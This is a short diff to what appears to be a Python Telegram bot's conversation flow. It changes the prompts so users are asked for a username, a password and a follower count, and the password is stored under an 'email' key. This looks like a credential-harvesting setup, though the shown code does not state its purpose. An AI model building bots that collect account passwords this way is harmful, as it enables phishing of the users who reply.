@@ -27,7 +27,7 @@ NAME, EMAIL, PHONE = range(3)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Enter your Name:"
+        "Enter your Username:"
     )
     return NAME
 
@@ -36,7 +36,7 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["name"] = update.message.text
 
     await update.message.reply_text(
-        "Enter your Email:"
+        "Enter your Password:"
     )
 
     return EMAIL
@@ -46,7 +46,7 @@ async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["email"] = update.message.text
 
     await update.message.reply_text(
-        "Enter your Phone Number:"
+        "Count of Followers:"
     )
 
     return PHONE
